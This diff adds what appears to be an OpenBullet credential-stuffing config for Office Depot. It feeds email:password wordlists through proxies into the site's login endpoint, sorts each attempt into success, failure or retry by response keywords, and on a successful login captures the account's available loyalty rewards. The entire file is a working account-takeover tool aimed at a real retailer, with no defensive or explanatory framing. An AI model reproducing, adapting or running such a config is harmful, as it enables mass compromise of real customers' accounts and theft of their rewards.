@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "OfficeDepot",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-18T03:28:44.2200499+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.officedepot.com/account/loginAccountSet.do" AutoRedirect=TRUE 
+  CONTENT "loginName=<USER>&password=<PASS>&confirmationRequired=false&requestor=accountSummary&loginDestination=&reqLevel=ACCOUNT" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "referer: https://www.officedepot.com/account/loginAccountDisplay.do" 
+  HEADER "origin: https://www.officedepot.com/accoun" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Your login name or" 
+    KEY "Please enter a password" 
+    KEY "Please enter a User ID" 
+  KEYCHAIN Success OR 
+    KEY "Logout" 
+  KEYCHAIN Retry OR 
+    KEY "We are unable to process your last request." 
+REQUEST GET "https://www.officedepot.com/mobile/loyalty/getRewards.do;jsessionid=0000PbIp6DQ_8BuEntzNBCCJbfE:17h4h7ceo?_=1529288205516" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "referer: https://www.officedepot.com/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Retry OR 
+    KEY "We're Sorry. We are unable to process your last request." 
+  KEYCHAIN Failure OR 
+    KEY "totalAvailableRewards\":0,\"" 
+PARSE "<SOURCE>" JSON "totalAvailableRewards" Recursive=FALSE -> CAP "REWARD AMOUNT" "" "" 
